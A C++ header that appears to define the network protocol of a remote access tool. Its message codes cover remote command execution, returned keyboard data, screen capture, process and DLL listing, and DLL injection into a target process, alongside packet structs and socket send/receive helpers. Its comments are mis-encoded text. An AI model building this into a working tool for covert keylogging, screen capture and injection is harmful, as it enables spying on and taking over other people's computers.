#pragma once
#include<iostream>
#define SEVER_CMD_COMMAND 1001
#define CLIENT_CMD_BACK 1002

#define CLIENT_KEYBOARD_BACK 2001

#define SERVER_SCREEN_COMMAND 3001
#define CLIENT_SCREEN_BACK 3002

#define SERVER_PROCESS_GET 4001
#define CLIENT_PROCESS_BACK 4002

#define SERVER_DLLLIST_VIEW 5001
#define CLIENT_DLLDATA_BACK 5002

#define SERVER_DLLPATH_INJECT 6001
#define CLIENT_DLLINJECT_RESULT 6002

#define Client_BEAT 10001
#define SERVER_BEAT 10002

#define HEART_BEAT_TIME 1000*5
#pragma pack(push)
#pragma pack(1)
#pragma pack(push)
#pragma pack(1)
struct screendata
{
	unsigned int width; //фад╩©М
	unsigned int height;    //фад╩╦ъ
	char data[];
};

struct dllinjectinf
{
	int size;
	DWORD dwpid;
	char dllpath[256] = { 0 };
};

struct DATA
{
	unsigned int type;
	unsigned int length;
	char reallydata[];
};
#pragma pack(pop)

inline bool recvdata(SOCKET s, char* pbuf, int bufsize)
{
	if (bufsize <= 0 || pbuf == NULL || s == INVALID_SOCKET)
	{
		return false;
	}

	int recvedsize = 0;

	while (recvedsize < bufsize)
	{
		int ret = recv(s, pbuf + recvedsize, bufsize - recvedsize, 0);
		if (ret <= 0) return false;
		else recvedsize += ret;
	}
	return true;
}

inline bool senddata(SOCKET s, unsigned int type, char* pbuf, int bufsize)
{
	if (bufsize <= 0 || pbuf == NULL || s == INVALID_SOCKET)
	{
		return false;
	}
	DATA pkt;
	pkt.length = bufsize;
	pkt.type = type;


	send(s, (char*)&pkt, sizeof(unsigned int) * 2, 0);
	send(s, pbuf, bufsize, 0);

	return true;
}

inline bool senddatahead(SOCKET s, unsigned int type)
{
	DATA datainf;
	datainf.length = 0;
	datainf.type = type;
	send(s, (char*)&datainf, sizeof(unsigned int) * 2, 0);
	return true;
}